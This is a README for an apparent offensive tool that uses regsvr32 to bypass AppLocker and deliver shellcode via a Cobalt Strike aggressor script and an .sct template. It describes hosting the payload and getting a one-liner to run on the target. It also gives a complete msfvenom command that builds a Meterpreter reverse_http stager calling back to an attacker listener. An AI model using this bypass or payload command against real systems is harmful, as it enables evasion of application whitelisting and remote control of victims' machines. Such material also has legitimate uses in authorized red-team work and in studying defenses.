# regsvr32

regsvr32 applocker bypass - arbitrary shellcode payload delivery via cobalt strike.  

see the companion blog post at http://atropineal.com/2017/05/20/playing-with-the-regsrv32-applocker-bypass/

files:

* regsvr32.cna: a cobalt strike aggressor script.  give it some shellcode and it'll host the file and supply you with a one-liner to execute on-target.  in this script you'll need to change the path to regsvr32.sct
* regsvr32.sct: a template that the aggressor script stuffs the shellcode into before hosting it for download via the one-liner

example shellcode to use (point it at metasploit, armitage or cobalt strike listeners):

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http LHOST=192.168.56.101 LPORT=80 EXITFUNC=thread -f raw > stager.bin

credits:

* yuri popov: for the dynamic wrapper x dll
* casey smith aka subtee: for the jscript that uses dynamic wrapper x dll, and a means to use it without registration

major reference sources:

* http://www.cyberforum.ru/post5932812.html
* https://gist.githubusercontent.com/subTee/ca6ab8ec75ec38c213da580cd0de30fe/raw/dbb7a6c3cb65fc2fcbb4bcfedc8395b258f9658a/calc.sct
* https://gist.github.com/subTee/353ba45c4f16646d10cdfd79cf9d88c9
* https://gist.github.com/iron9light/1191402
* http://sleep.dashnine.org/manual/
* https://www.cobaltstrike.com/aggressor-script/index.html
